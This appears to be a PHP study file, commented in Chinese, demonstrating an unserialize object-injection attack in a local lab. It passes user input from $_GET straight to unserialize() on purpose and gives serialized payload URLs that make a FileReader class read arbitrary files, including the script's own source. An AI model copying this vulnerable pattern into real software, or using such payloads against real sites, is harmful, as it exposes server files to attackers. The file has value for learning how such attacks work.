<?php

// 构造一个类，用于读取变量指定的文件
class FileReader {
    var $filename = '';

    function __toString() {
        return file_get_contents($this->filename);
    }
}

// 生成序列化数据
// $fr = new FileReader();
// $fr->filename = 'Test.txt';
// echo serialize($fr);        // 打印后将其保存: O:10:"FileReader":1:{s:8:"filename";s:8:"Test.txt";}


// 定义用户访问接口
class User {
    var $name = '';
    var $age = 0;
    function __toString() {
        echo "$this->name is $this->age years old.<br/>";
    }
}

$obj = unserialize($_GET['source']);
echo $obj;

// 此时，打开浏览器，访问的URL地址如下：
// http://localhost/learn/misc/unserial.php?source=O:10:%22FileReader%22:1:{s:8:%22filename%22;s:8:%22Test.txt%22;}
// http://localhost/learn/misc/unserial.php?source=O:10:%22FileReader%22:1:{s:8:%22filename%22;s:10:%22serial.php%22;}


// 与上述payload和模拟过程类似，也可以写文件，此时便更有发挥空间